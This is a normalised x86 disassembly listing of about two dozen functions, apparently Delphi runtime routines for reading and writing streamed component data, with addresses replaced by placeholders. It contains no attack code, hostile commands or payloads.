mov eax ebx
call sub_41deec
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404890
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e086
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41e08c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c650
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40498c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41c650
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c650
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404684
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c650
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405d04
jmp r-xdata
jmp r-xdata
call sub_41c128
sub_41e0a0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e0dc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41deb0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0e3
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41e0e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c2e8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e19c
mov eax [ ebx ]
call sub_41d254
pop ebx
pop ebp
retn
sub_41e110
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c650
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e594
pop ebx
pop ecx
pop ebp
retn
sub_41e140
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c2e8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c62c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41d254
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41e594
jmp r-xdata
mov eax [ ebx ]
call sub_41e19c
mov eax [ ebx ]
call sub_41c2e8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e338
mov eax [ ebx ]
call sub_41d254
sub_41e19c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e32b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e08c
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e332
lea eax [ ebp - 0x8 ]
call sub_404038
retn
jmp [ eax * 4 + jump_table_41e1d3 ]
push ebp
call sub_41e0e8
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41deb0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e110
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e0a0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e110
pop ecx
jmp r-xdata
push ebp
call sub_41e140
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
push ebp
mov eax 0x2
call sub_41e110
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e594
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e110
pop ecx
sub_41e338
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e375
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41deb0
mov eax ebx
call sub_41e19c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e37c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41e380
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41e418
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41c2e8
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41deb0
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41deb0
jmp r-xdata
mov eax ebx
call sub_41e338
mov eax ebx
call sub_41d254
jmp r-xdata
mov eax ebx
call sub_41c2e8
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41e380
mov eax ebx
call sub_41d254
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e41f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
sub_41e428
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e4cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040d0
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_421450
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4d4
lea eax [ ebp - 0x8 ]
call sub_404038
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
sub_41e4f8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41e520
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41c580
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417d6c
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4034d4
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41c580
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41e594
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41c650
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41c650
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41e5dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e785
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41c1b4
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e760
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c650
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41b07c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41c650
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba70
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e73b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41deec
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41c650
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41b07c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41c650
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4147a4
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
lea eax [ ebp - 0x1c ]
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d524
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e742
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_41e7a4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e99e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f1d8
mov eax [ ebp - 0x4 ]
call sub_41c62c
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
jmp [ eax * 4 + jump_table_41e7e6 ]
mov eax [ ebp - 0x4 ]
call sub_41e08c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d19c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_413368
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d19c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_413368
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d19c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413368
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf80
mov eax ebx
call sub_413560
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cfc4
mov eax ebx
call sub_413560
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d008
mov eax ebx
call sub_413588
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d058
mov eax ebx
call sub_413574
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41deec
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41359c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41dfa8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4135c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e08c
cmp al 0x9
sete dl
mov eax ebx
call sub_413538
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41e5dc
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f500
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d208
push edx
push eax
mov eax ebx
call sub_413464
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9a5
lea eax [ ebp - 0x1c ]
call sub_40f1ec
lea eax [ ebp - 0xc ]
call sub_404744
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax ebx
call sub_41488c
jmp r-xdata
sub_41e9ac
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_41eb78
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bab8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41e9e4
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420ab0
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41ea0c
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_420ab0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41eaf0
sub_41ea50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41aff8
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41eb78
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41b018
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41eaa4
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41eb78
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41eaf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eb67
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_420cfc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41eaa4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41eaa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb6e
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_41eba4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41ebe7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404220
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_420bf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebee
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41ebf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41ec86
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_420cfc
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f488
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec8d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_419748
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41f480
mov edx esi
mov eax edi
call sub_419750
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f4d4
mov eax [ ebp - 0x4 ]
call sub_41f488
inc esi
dec ebx
jne r-xdata
sub_41ec94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4188d4
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_408048
test al al
jne r-xdata
sub_41ece4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41ee2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_42156c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41ec94
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421540
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_42156c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421540
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee32
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421540
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421540
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41ee38
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f214
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031f8
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4042f8
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ea38
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eb78
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41f490
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031f8
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_40429c
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420b14
mov eax [ ebp - 0x8 ]
call sub_4031f0
call sub_4034e8
call sub_414b1c
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_40429c
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031f8
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_40429c
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_4043b8
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420b14
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f4d4
mov eax [ ebp - 0x4 ]
call sub_41f488
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41f1b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420b14
mov eax [ ebp - 0x4 ]
call sub_41ea38
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4188d4
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1bc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41f173
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41ece4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4032a8
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e9d8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_4034a4
test [ ebx + 0x1d ] 0x2
je r-xdata
